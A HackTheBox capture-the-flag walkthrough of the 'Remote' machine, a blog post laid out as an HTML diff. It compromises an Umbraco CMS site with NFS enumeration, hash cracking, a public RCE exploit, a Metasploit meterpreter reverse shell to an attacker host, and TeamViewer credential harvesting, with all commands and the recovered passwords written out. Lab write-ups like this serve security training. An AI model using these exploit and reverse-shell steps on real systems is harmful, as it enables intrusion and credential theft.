@@ -1,0 +1,129 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Remote HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/remote-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-16T07:31:26+00:00">February 16, 2021</time><time class="updated" datetime="2025-06-22T13:36:25+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Remote. It was created by <span style="color: #0000ff;"><strong>mrb3n</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Enumerating Umbraco CMS</span></li>
+<li><span style="color: #000000;">Enumerating NFS Service</span></li>
+<li><span style="color: #000000;">Extracting password hash from DB File</span></li>
+<li><span style="color: #000000;">Decrypting Hash using John The Ripper</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Remote Command Execution</span></li>
+<li><span style="color: #000000;">Downloading Exploit for RCE</span></li>
+<li><span style="color: #000000;">Testing RCE</span></li>
+<li><span style="color: #000000;">Getting meterpreter using RCE</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Installed Programs</span></li>
+<li><span style="color: #000000;">Using Post Exploitation script to extract password</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: <strong>10.129.77.180</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.77.180</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BSEXvn3PUbs/YCtxO8E5mDI/AAAAAAAAtuY/7lqRXZQ-dh0tkyP7zx2Cl8OrDS63PV9uACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 21 (FTP), 80 (HTTP), 111 (RPC), 135 (MSRPC), 139 (NetBIOS), 445 and 2049 (NFS).</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Since FTP is open and the Anonymous Login is enabled, I tried logging into it. We connected, but there was nothing in the share and we don’t have the permission to upload using FTP. So, we had to move on.</span></p>
+<p><span style="color: #000000;">Next, we poked in the HTTP Service. We enumerated the HTTP service by opening it into a browser. It was a website for ACME Widgets. There were a bunch of pages on the website but none of them provided any insight to move forward.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KS8Mpz_hnBQ/YCtxV0ASm5I/AAAAAAAAtuc/wJlVkU7xbS4VfkjXtSBxfOSNkHdo7RTpwCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">While enumerating the CMS in general we found hints that the Umbraco is used. Hence, we will focus our enumeration on this direction.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PmqFfTdAoo0/YCtxaXC4Z-I/AAAAAAAAtug/HrCcMKd6a3AF3-GoP7fhQcNNLeoprqaEgCLcBGAsYHQ/s16000/3.png"/></span></p>
+<h4><span style="color: #000000;">Discovering Admin Credentials</span></h4>
+<p><span style="color: #000000;">We read more about Umbraco CMS and its functionalities and possible exploits.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-03Zus9-KZug/YCtxfaBFBmI/AAAAAAAAtuo/Ob1tfsZTJsIXS4lItSipo8BYnOGhPFR2ACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Browsing through the documentation of Umbraco gives us the location of the Administrator Login Panel. It is located on /Umbraco. Here, we have a simple login which accepts the admin credentials. Until now we have not gotten the administrator credentials. We attempted some default credentials or basic credentials. We were not able to get in.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-i-YGbflsL48/YCtxkM2szVI/AAAAAAAAtus/5qkE27qFff8VW5BVIWJLgu9V2kcggI0qgCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Now, we enumerated SMB and other services but didn’t have any luck finding credentials. Now we focused on NFS. To access this service, we will use the showmount command. We see that site_backup can be accessed by everyone. Hence, we transferred it to our local machine. After transferring, we started enumerating it for credentials. We found a directory named App Data. Inside it we found a Database file as shown.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /tmp/raj
+showmount -e 10.129.77.180
+mount -t nfs 10.129.77.180:/site_backups /tmp/raj</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MdNQfwBaAvo/YCtxqA136gI/AAAAAAAAtu4/BI5-zBPkAag6dSId0I4LPRfB6KILSTsCQCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">There are a bunch of tools available for reading data from a .sdf file but we decided to go with the strings. Also, since we are looking for admin credentials, we added a grep filter with admin keyword. In no time we see that it has the password hash. The hash is identified as SHA1.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">strings Umbraco.sdf | grep admin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EiCWEqsjlRw/YCtxvk_-TII/AAAAAAAAtvA/_LDyNWNJ-qs9YgLFhNWqE0Z7VQ0iN9WCQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">We created the file named hash and copied the acquired hash into it. We then used john the ripper to</span></p>
+<p><span style="color: #000000;">Bruteforce it. After working on it for a while, we got the password. Its <strong>baconandcheese</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john –wordlist=/usr/share/wordlists/rockyou.txt hash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NOr__4FCtz8/YCtx3H4NVxI/AAAAAAAAtvI/fjJ4LoCvraYCnmksZ2GrtVlEsPPgvr6dgCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">From the strings output, we know that the email address for the admin account is <a style="color: #000000;" href="mailto:admin@htb.local">admin@htb.local</a> and the password we just got is baconandcheese. So, we used this set of credentials for logging into Umbraco.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lAKQ61hdM-w/YCtx9dNZqnI/AAAAAAAAtvQ/U1XriDxQPck2DRGEuPt2bVq5Y5wnaVT5ACLcBGAsYHQ/s16000/9.png"/></span></p>
+<h4><span style="color: #000000;">Gaining Remote Code Execution</span></h4>
+<p><span style="color: #000000;">Getting inside we resume our Enumeration to find a way to get a shell on the machine. While looking around we got the version of Umbraco.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Oucemj4Zx9I/YCtyFffP_wI/AAAAAAAAtvU/c30m4LmhaMY4M0F_jEate4jz12sLyWguwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Searching the Version, we found that this version is vulnerable to Remote Command Execution. Here, we found a payload that can be used to run arbitrary command on the target machine. Then, we download the exploit from GitHub Repository and install the basic requirements in order to use it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/noraj/Umbraco-RCE
+cd Umbraco-RCE
+pip3 install -r requirements.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1JXushEw_lM/YCtyNXi6VKI/AAAAAAAAtvc/7m1NoyzZ398l4m7LS0WhaPTJKlt1ByAzACLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">We run the exploit on the target machine. It requires the login credentials and the command that we want to execute. We ran hostname pwd and some other command to test the exploit. It worked successfully.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.77.180' -c powershell.exe -a 'hostname; pwd; whoami'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QkbZQp_zqZQ/YCtyTGVCKvI/AAAAAAAAtvg/MSFXtW9F-BUet90QO_oxKhJS7UhfY-amACLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Now, time to invoke a shell using this remote command execution vulnerability. To do this we will be crafting a script using the web delivery exploit in Metasploit. Since we know that the target machine is a Windows Machine, we will craft the payload accordingly. The exploit code that is generated, we copy It from here.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.52
+set srvhost 10.10.14.52
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_9PeaV3eoe4/YCtyY71Q6sI/AAAAAAAAtvo/rhWaLK19p3cNa8KG3N5V9sCOiyc9rwOQACLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Now we will go back to the location where we ran hostname on the target machine and this time, we will replace the command with the exploit code that we generated by the web delivery as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.77.180' -c powershell.exe -a '[Exploit Code]';</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jovs95TNIP4/YCtyeCiXLtI/AAAAAAAAtvw/gqOAWjHd80c45ln-eofXVXcIfVqUSoQAwCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">As soon as we execute the exploit on the target machine, we get a meterpreter session on our machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions 1
+sysinfo
+pwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D7QXrS2t3WA/YCtyj7oez1I/AAAAAAAAtv4/t3uf9E_XXzY0JtPQJhMACzHcPJH8i782ACLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Now that we have the session on the target machine, let’s enumerate the user flag. There is no user other than the Administrator user. So, we looked into the Public Directory and we found our user flag here.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Users\Public
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q2JIMLVK3xQ/YCtyo4Hv2qI/AAAAAAAAtwA/Sc86PwNWrWAJvMCj3oy256f-jyGbe35xQCLcBGAsYHQ/s16000/16.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Time to start enumerating the machine for a possible way to elevate the privileges. Enumerating through different directories, we stumbled upon the Program Files directory and here we found the TeamViewer installed on the application. Moving inside the application folder, we see that the TeamViewer Version is 7.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Program Files (x86)
+ls
+cd TeamViewer
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bagmd6aJiKg/YCtyuxnZSQI/AAAAAAAAtwE/cVLnuKs2Rq8MbZj5Pp3jrci9cHMJqWAIACLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We remember that there is Metasploit post-exploitation script that can search for the TeamViewer credentials. We load the post-exploitation module and run it. It gave us the password <strong>!R3m0te!. </strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/gather/credentials/teamviewer_passwords
+set session 1
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ThEvAIh3pjw/YCty2dEYrMI/AAAAAAAAtwM/xmMod5AktMsEMZM_SA6PKcG9hlQ8JOYrwCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">This TeamViewer password works for the administrator account on the machine. This means that we can get a shell using these credentials. For that first we need to install Evil-WinRM.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gem install evil-winrm</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YJ7FPXe78_g/YCty8AMtbjI/AAAAAAAAtwQ/sHm0GqZ-wYAxoLwEIcMLSyYD0lpZ1WiMgCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">We gave the username administrator and password !R3m0te! with the target IP Address and we got the administrator shell. All that’s need to be done is reading the root flag and that concludes this machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -u administrator -p !R3m0te! -i 10.129.77.180</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dZKuJRGdty4/YCtzBFcU6zI/AAAAAAAAtwY/Bi4R_1fYtl4c_OYX7J5UNzJiStl_u1VEwCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
